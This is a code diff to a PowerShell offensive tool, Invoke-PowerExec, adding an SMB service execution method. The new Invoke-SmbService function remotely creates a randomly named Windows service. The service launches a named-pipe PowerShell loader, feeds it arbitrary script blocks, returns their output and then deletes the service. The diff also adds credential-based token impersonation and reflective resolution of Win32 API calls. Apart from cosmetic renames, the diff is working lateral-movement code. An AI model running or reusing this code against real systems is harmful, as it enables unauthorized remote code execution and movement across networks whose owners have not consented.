@@ -1,6 +1,6 @@
 #requires -version 3
 
-function Invoke-PowerExec {
+Function Invoke-PowerExec {
 <#
 .SYNOPSIS
     Invoke PowerShell commands on remote computers.
@@ -57,7 +57,7 @@ function Invoke-PowerExec {
         [Management.Automation.Credential()]
         $Credential = [Management.Automation.PSCredential]::Empty,
 
-        [ValidateSet('CimProcess', 'CimTask', 'CimService', 'CimSubscription', 'WinRM')]
+        [ValidateSet('CimProcess', 'CimTask', 'CimService', 'CimSubscription', 'SmbService', 'WinRM')]
         [String]
         $Method = 'CimProcess',
 
@@ -113,7 +113,7 @@ function Invoke-PowerExec {
 }
 
 # Adapted from Find-Fruit by @rvrsh3ll
-function Local:New-IPv4RangeFromCIDR {
+Function Local:New-IPv4RangeFromCIDR {
     Param (
         [Parameter(Mandatory=$true)]
         [ValidateNotNullOrEmpty()]
@@ -156,7 +156,7 @@ function Local:New-IPv4RangeFromCIDR {
     return $hostList
 }
 
-function Local:Get-LdapObject {
+Function Local:Get-LdapObject {
     Param (
         [Parameter(Mandatory=$true)]
         [ValidateNotNullOrEmpty()]
@@ -222,7 +222,7 @@ function Local:Get-LdapObject {
 }
 
 # Adapted from PowerView by @harmj0y and @mattifestation
-function Local:New-ThreadedFunction {
+Function Local:New-ThreadedFunction {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [CmdletBinding()]
     Param(
@@ -348,7 +348,7 @@ function Local:New-ThreadedFunction {
     }
 }
 
-function Local:New-PowerExec {
+Function Local:New-PowerExec {
     Param (
         [Parameter(Mandatory = $True)]
         [ScriptBlock]
@@ -364,7 +364,7 @@ function Local:New-PowerExec {
         [Management.Automation.Credential()]
         $Credential = [Management.Automation.PSCredential]::Empty,
 
-        [ValidateSet('CimProcess', 'CimTask', 'CimService', 'CimSubscription', 'WinRM')]
+        [ValidateSet('CimProcess', 'CimTask', 'CimService', 'CimSubscription', 'SmbService', 'WinRM')]
         [String]
         $Method = 'CimProcess',
 
@@ -477,6 +477,22 @@ function Local:New-PowerExec {
                 }
             }
         }
+        'SmbService' {
+            try {
+                $output = Invoke-SmbService -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Verbose:$false
+            }
+            catch [Management.Automation.RuntimeException] {
+                if ($Error[0].FullyQualifiedErrorId -eq '5') {
+                    Write-Verbose "[$ComputerName] Access is denied."
+                }
+                elseif ($Error[0].FullyQualifiedErrorId -eq '1722') {
+                    Write-Verbose "[$ComputerName] Host is unreachable."
+                }
+                else {
+                    Write-Warning "[$ComputerName] Execution failed. $_"
+                }
+            }
+        }
     }
     if ($output) {
         Write-Host "[$ComputerName] Successful execution"
@@ -484,7 +500,7 @@ function Local:New-PowerExec {
     }
 }
 
-function Local:Invoke-CimDelivery {
+Function Local:Invoke-CimDelivery {
     Param (
         [Parameter(Mandatory = $True)]
         [CimSession]
@@ -526,7 +542,7 @@ function Local:Invoke-CimDelivery {
     }
 }
 
-function Local:Invoke-CimRecovery {
+Function Local:Invoke-CimRecovery {
     Param (
         [Parameter(Mandatory = $True)]
         [CimSession]
@@ -562,7 +578,7 @@ function Local:Invoke-CimRecovery {
     }
 }
 
-function Local:Invoke-CimProcess {
+Function Local:Invoke-CimProcess {
     [CmdletBinding()]
     Param (
         [ValidateNotNullOrEmpty()]
@@ -617,7 +633,7 @@ function Local:Invoke-CimProcess {
     }
 }
 
-function Local:Invoke-CimTask {
+Function Local:Invoke-CimTask {
     [CmdletBinding()]
     Param (
         [ValidateNotNullOrEmpty()]
@@ -696,7 +712,7 @@ function Local:Invoke-CimTask {
     }
 }
 
-function Local:Invoke-CimService {
+Function Local:Invoke-CimService {
     [CmdletBinding()]
     Param (
         [ValidateNotNullOrEmpty()]
@@ -775,7 +791,7 @@ function Local:Invoke-CimService {
     }
 }
 
-function Local:Invoke-CimSubscription {
+Function Local:Invoke-CimSubscription {
     [CmdletBinding()]
     Param (
         [ValidateNotNullOrEmpty()]
@@ -864,4 +880,279 @@ function Local:Invoke-CimSubscription {
         Invoke-CimRecovery -CimSession $cimSession -DefaultValue $delivery.OriginalValue
         Remove-CimSession -CimSession $cimSession
     }
+}
+
+function Local:Invoke-SmbService {
+    [CmdletBinding()]
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [ScriptBlock]
+        $ScriptBlock,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $ComputerName = $env:COMPUTERNAME,
+
+        [ValidateNotNullOrEmpty()]
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $PipeName = [guid]::NewGuid().Guid,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $ServiceName = [guid]::NewGuid().Guid
+    )
+
+    BEGIN {
+        if ($Credential.UserName) {
+            $logonToken = Invoke-UserImpersonation -Credential $Credential
+        }
+
+        $CloseServiceHandleAddr = Get-ProcAddress Advapi32.dll CloseServiceHandle
+        $CloseServiceHandleDelegate = Get-DelegateType @([IntPtr]) ([Int])
+        $CloseServiceHandle = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseServiceHandleAddr, $CloseServiceHandleDelegate)    
+
+        $OpenSCManagerAAddr = Get-ProcAddress Advapi32.dll OpenSCManagerA
+        $OpenSCManagerADelegate = Get-DelegateType @([String], [String], [Int]) ([IntPtr])
+        $OpenSCManagerA = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenSCManagerAAddr, $OpenSCManagerADelegate)
+
+        $OpenServiceAAddr = Get-ProcAddress Advapi32.dll OpenServiceA
+        $OpenServiceADelegate = Get-DelegateType @([IntPtr], [String], [Int]) ([IntPtr])
+        $OpenServiceA = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenServiceAAddr, $OpenServiceADelegate)
+      
+        $CreateServiceAAddr = Get-ProcAddress Advapi32.dll CreateServiceA
+        $CreateServiceADelegate = Get-DelegateType @([IntPtr], [String], [String], [Int], [Int], [Int], [Int], [String], [String], [Int], [Int], [Int], [Int]) ([IntPtr])
+        $CreateServiceA = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateServiceAAddr, $CreateServiceADelegate)
+
+        $StartServiceAAddr = Get-ProcAddress Advapi32.dll StartServiceA
+        $StartServiceADelegate = Get-DelegateType @([IntPtr], [Int], [Int]) ([IntPtr])
+        $StartServiceA = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StartServiceAAddr, $StartServiceADelegate)
+
+        $DeleteServiceAddr = Get-ProcAddress Advapi32.dll DeleteService
+        $DeleteServiceDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
+        $DeleteService = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DeleteServiceAddr, $DeleteServiceDelegate)
+
+        $GetLastErrorAddr = Get-ProcAddress Kernel32.dll GetLastError
+        $GetLastErrorDelegate = Get-DelegateType @() ([Int])
+        $GetLastError = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetLastErrorAddr, $GetLastErrorDelegate)
+
+        $loader = ''
+        $loader += '$s = new-object IO.Pipes.NamedPipeServerStream(''' + $PipeName + ''', 3); '
+        $loader += '$s.WaitForConnection(); '
+        $loader += '$r = new-object IO.StreamReader $s; '
+        $loader += '$x = ''''; '
+        $loader += 'while (($y=$r.ReadLine()) -ne ''''){$x+=$y+[Environment]::NewLine}; '
+        $loader += '$z = [ScriptBlock]::Create($x); '
+        $loader += '& $z'
+        $command = '%COMSPEC% /c start %COMSPEC% /c powershell -NoP -NonI -C "' + $loader + '"'
+    }
+
+    PROCESS {
+        Write-Verbose "[SMBEXEC] Opening service manager"
+        $managerHandle = $OpenSCManagerA.Invoke("\\$ComputerName", "ServicesActive", 0xF003F)
+        if ((-not $managerHandle) -or ($managerHandle -eq 0)) {
+            throw $GetLastError.Invoke()
+        }
+
+        Write-Verbose "[SMBEXEC] Creating new service: '$ServiceName'"
+        $serviceHandle = $CreateServiceA.Invoke($managerHandle, $ServiceName, $ServiceName, 0xF003F, 0x10, 0x3, 0x1, $command, $null, $null, $null, $null, $null)
+        if ((-not $serviceHandle) -or ($serviceHandle -eq 0)) {
+            $err = $GetLastError.Invoke()
+            Write-Warning "[SMBEXEC] CreateService failed, LastError: $err"
+            break
+        }
+        $CloseServiceHandle.Invoke($serviceHandle) | Out-Null
+
+        Write-Verbose "[SMBEXEC] Opening the service"
+        $serviceHandle = $OpenServiceA.Invoke($managerHandle, $ServiceName, 0xF003F)
+        if ((-not $serviceHandle) -or ($serviceHandle -eq 0)) {
+            $err = $GetLastError.Invoke()
+            Write-Warning "[SMBEXEC] OpenServiceA failed, LastError: $err"
+        }
+
+        Write-Verbose "[SMBEXEC] Starting the service"
+        if ($StartServiceA.Invoke($serviceHandle, $null, $null) -eq 0){
+            $err = $GetLastError.Invoke()
+            if ($err -eq 1053){
+                Write-Verbose "[SMBEXEC] Command didn't respond to start"
+            }
+            else{
+                Write-Warning "[SMBEXEC] StartService failed, LastError: $err"
+            }
+            Start-Sleep -Seconds 1
+        }
+
+        $script = ''
+        $script += '[ScriptBlock]$scriptBlock = {' + $ScriptBlock.Ast.Extent.Text + '}' + [Environment]::NewLine -replace '{{','{' -replace '}}','}'
+        $script += '$output = [Management.Automation.PSSerializer]::Serialize((& $scriptBlock *>&1))' + [Environment]::NewLine
+        $script += '$encOutput = [char[]]$output' + [Environment]::NewLine
+        $script += '$writer = [IO.StreamWriter]::new($s)' + [Environment]::NewLine
+        $script += '$writer.AutoFlush = $true' + [Environment]::NewLine
+        $script += '$writer.WriteLine($encOutput)' + [Environment]::NewLine
+        $script += '$writer.Dispose()' + [Environment]::NewLine
+        $script += '$r.Dispose()' + [Environment]::NewLine
+        $script += '$s.Dispose()' + [Environment]::NewLine
+        $script = $script -creplace '(?m)^\s*\r?\n',''
+        $in = [char[]] $script
+
+        $pipeclient = New-Object IO.Pipes.NamedPipeClientStream($ComputerName, $PipeName, [IO.Pipes.PipeDirection]::InOut, [IO.Pipes.PipeOptions]::None, [Security.Principal.TokenImpersonationLevel]::Impersonation)
+        $pipeclient.Connect()
+        $writer = New-Object  IO.StreamWriter($pipeclient)
+        $writer.AutoFlush = $true
+        $writer.WriteLine($in)
+        $reader = new-object IO.StreamReader($pipeclient)
+        $output = ''
+        while (($data = $reader.ReadLine()) -ne $null) {
+            $output += $data + [Environment]::NewLine
+        }
+        Write-Output ([Management.Automation.PSSerializer]::Deserialize($output))
+    }
+
+    END {
+        $reader.Dispose()
+        $pipeclient.Dispose()
+
+        Write-Verbose "[SMBEXEC] Deleting the service"
+        if ($DeleteService.invoke($serviceHandle) -eq 0){
+            $err = $GetLastError.Invoke()
+            Write-Warning "[SMBEXEC] DeleteService failed, LastError: $err"
+        }
+        $CloseServiceHandle.Invoke($serviceHandle) | Out-Null
+        $CloseServiceHandle.Invoke($managerHandle) | Out-Null
+
+        if ($logonToken) {
+            Invoke-RevertToSelf -TokenHandle $logonToken
+        }
+    }
+}
+
+Function Local:Get-DelegateType {
+    Param (
+        [OutputType([Type])]
+
+        [Parameter( Position = 0)]
+        [Type[]]
+        $Parameters = (New-Object Type[](0)),
+
+        [Parameter( Position = 1 )]
+        [Type]
+        $ReturnType = [Void]
+    )
+    $Domain = [AppDomain]::CurrentDomain
+    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [MulticastDelegate])
+    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [Reflection.CallingConventions]::Standard, $Parameters)
+    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
+    Write-Output $TypeBuilder.CreateType()
+}
+
+Function Local:Get-ProcAddress {
+    Param (
+        [OutputType([IntPtr])]
+
+        [Parameter( Position = 0, Mandatory = $True )]
+        [String]
+        $Module,
+
+        [Parameter( Position = 1, Mandatory = $True )]
+        [String]
+        $Procedure
+    )
+    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([Runtime.InteropServices.HandleRef], [String]))
+    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+    $tmpPtr = New-Object IntPtr
+    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+    Write-Output $GetProcAddress.Invoke($null, @([Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
+}
+
+# Adapted from PowerView by @harmj0y and @mattifestation
+Function Local:Invoke-UserImpersonation {
+    [OutputType([IntPtr])]
+    [CmdletBinding(DefaultParameterSetName = 'Credential')]
+    Param(
+        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
+        [Management.Automation.PSCredential]
+        [Management.Automation.CredentialAttribute()]
+        $Credential,
+
+        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
+        [ValidateNotNull()]
+        [IntPtr]
+        $TokenHandle,
+
+        [Switch]
+        $Quiet
+    )
+
+    if (([Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
+        Write-Warning "[UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
+    }
+
+    $LogonUserAddr = Get-ProcAddress Advapi32.dll LogonUserA
+    $LogonUserDelegate = Get-DelegateType @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
+    $LogonUser = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LogonUserAddr, $LogonUserDelegate)
+
+    $ImpersonateLoggedOnUserAddr = Get-ProcAddress Advapi32.dll ImpersonateLoggedOnUser
+    $ImpersonateLoggedOnUserDelegate = Get-DelegateType @([IntPtr]) ([Bool])
+    $ImpersonateLoggedOnUser = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateLoggedOnUserAddr, $ImpersonateLoggedOnUserDelegate)
+
+    if ($PSBoundParameters['TokenHandle']) {
+        $LogonTokenHandle = $TokenHandle
+    }
+    else {
+        $LogonTokenHandle = [IntPtr]::Zero
+        $NetworkCredential = $Credential.GetNetworkCredential()
+        $UserDomain = $NetworkCredential.Domain
+        $UserName = $NetworkCredential.UserName
+        Write-Verbose "[UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"
+
+        if (-not $LogonUser.Invoke($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle)) {
+            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            throw "[UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+        }
+    }
+
+    if (-not $ImpersonateLoggedOnUser.Invoke($LogonTokenHandle)) {
+        throw "[UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+    }
+    Write-Verbose "[UserImpersonation] Alternate credentials successfully impersonated"
+    $LogonTokenHandle
+}
+
+Function Local:Invoke-RevertToSelf {
+    [CmdletBinding()]
+    Param(
+        [ValidateNotNull()]
+        [IntPtr]
+        $TokenHandle
+    )
+
+    $CloseHandleAddr = Get-ProcAddress Kernel32.dll CloseHandle
+    $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
+    $CloseHandle = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
+
+    $RevertToSelfAddr = Get-ProcAddress Advapi32.dll RevertToSelf
+    $RevertToSelfDelegate = Get-DelegateType @() ([Bool])
+    $RevertToSelf = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)
+
+    if ($PSBoundParameters['TokenHandle']) {
+        Write-Verbose "[RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
+        $CloseHandle.Invoke($TokenHandle) | Out-Null
+    }
+    if (-not $RevertToSelf.Invoke()) {
+        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        throw "[RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+    }
+    Write-Verbose "[RevertToSelf] Token impersonation successfully reverted"
 }
